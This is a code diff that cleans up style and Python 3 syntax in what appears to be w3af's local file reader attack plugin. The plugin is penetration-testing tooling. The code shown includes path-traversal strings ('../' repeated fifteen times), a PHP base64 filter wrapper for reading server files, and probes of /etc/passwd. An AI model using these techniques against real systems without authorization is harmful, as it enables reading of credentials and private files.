@@ -59,7 +59,7 @@ class local_file_reader(AttackPlugin):
 
         Then the exploit plugin that exploits os_commanding
         (attack.os_commanding) should return ['os_commanding',] in this method.
-        
+
         If there is more than one location the implementation should return
         ['a', 'b', ..., 'n']
         """
@@ -99,7 +99,7 @@ class local_file_reader(AttackPlugin):
         """
         Try to define the cut with a relaxed algorithm based on two different
         http requests.
-        
+
         :return : True if vuln can be exploited and the information extracted
         """
         orig_mutant = vuln_obj.get_mutant()
@@ -111,7 +111,7 @@ class local_file_reader(AttackPlugin):
         try:
             response_a = self._uri_opener.send_mutant(orig_mutant)
             response_b = self._uri_opener.send_mutant(copy_mutant)
-        except BaseFrameworkException, e:
+        except BaseFrameworkException as e:
             om.out.error(str(e))
             return False
         else:
@@ -120,17 +120,17 @@ class local_file_reader(AttackPlugin):
                                vuln_obj['file_pattern']):
                 return True
             else:
-                return False    
-    
+                return False
+
     def _strict_with_etc_passwd(self, vuln_obj):
         """
         Try to define the cut with a very strict algorithm based on the
         /etc/passwd file format.
-        
+
         :return : True if vuln can be exploited and the information extracted
         """
         # Check if we can apply a stricter extraction method
-        if not 'passwd' in vuln_obj.get_mutant().get_token_value():
+        if 'passwd' not in vuln_obj.get_mutant().get_token_value():
             return False
 
         mutant = vuln_obj.get_mutant()
@@ -138,14 +138,14 @@ class local_file_reader(AttackPlugin):
         try:
             response_a = self._uri_opener.send_mutant(mutant)
             response_b = self._uri_opener.send_mutant(mutant)
-        except BaseFrameworkException, e:
+        except BaseFrameworkException as e:
             om.out.error(str(e))
             return False
 
         try:
             cut = self._define_cut_from_etc_passwd(response_a.get_body(),
                                                    response_b.get_body())
-        except ValueError, ve:
+        except ValueError as ve:
             om.out.error(str(ve))
             return False
         else:
@@ -172,6 +172,7 @@ class local_file_reader(AttackPlugin):
         statement, you wont be able to read the source code of the script file,
         you will end up reading the result of the script interpretation.
         """
+
 
 PERMISSION_DENIED = 'Permission denied.'
 NO_SUCH_FILE = 'No such file or directory.'
@@ -229,9 +230,9 @@ class FileReaderShell(ReadShell):
         # PHP wrapper configuration
         self._use_base64_wrapper = False
         try:
-            #FIXME: This only works in Linux!
+            # FIXME: This only works in Linux!
             response = self._read_with_b64('/etc/passwd')
-        except Exception, e:
+        except Exception as e:
             msg = 'Not using base64 wrapper for reading because of ' \
                   'exception: "%s"'
             om.out.debug(msg % e)
@@ -259,13 +260,14 @@ class FileReaderShell(ReadShell):
         if self._use_base64_wrapper:
             try:
                 return self._read_with_b64(filename)
-            except Exception, e:
+            except Exception as e:
                 om.out.debug('read_with_b64 failed: "%s"' % e)
 
         return self._read_basic(filename)
 
     def _read_with_b64(self, filename):
-        # TODO: Review this hack, does it work every time? What about null bytes?
+        # TODO: Review this hack, does it work every time? What about null
+        # bytes?
         filename = '../' * 15 + filename
         filename = 'php://filter/convert.base64-encode/resource=' + filename
 
@@ -277,7 +279,8 @@ class FileReaderShell(ReadShell):
         return filtered_response
 
     def _read_basic(self, filename):
-        # TODO: Review this hack, does it work every time? What about null bytes?
+        # TODO: Review this hack, does it work every time? What about null
+        # bytes?
         filename = '../' * 15 + filename
         filtered_response = self._read_utils(filename)
         return filtered_response
@@ -292,21 +295,21 @@ class FileReaderShell(ReadShell):
 
         try:
             response = self._uri_opener.send_mutant(mutant)
-        except BaseFrameworkException, e:
+        except BaseFrameworkException as e:
             msg = 'Error "%s" while sending request to remote host. Try again.'
             return msg % e
 
         try:
             cut_response = self._cut(response.get_body())
-        except BodyCutException, bce:
+        except BodyCutException as bce:
             issue = 'https://github.com/andresriancho/w3af/issues/5139'
 
-            msg = ('Unexpected exception "%s" while trying to extract the file'
-                   ' content from the HTTP response body. Please try again.\n\n'
-
-                   'If the problem persists please add a comment with this'
-                   ' exception message and the steps to reproduce the issue'
-                   ' to %s\n\n')
+            msg = (
+                'Unexpected exception "%s" while trying to extract the file'
+                ' content from the HTTP response body. Please try again.\n\n'
+                'If the problem persists please add a comment with this'
+                ' exception message and the steps to reproduce the issue'
+                ' to %s\n\n')
 
             return msg % (bce, issue)
 
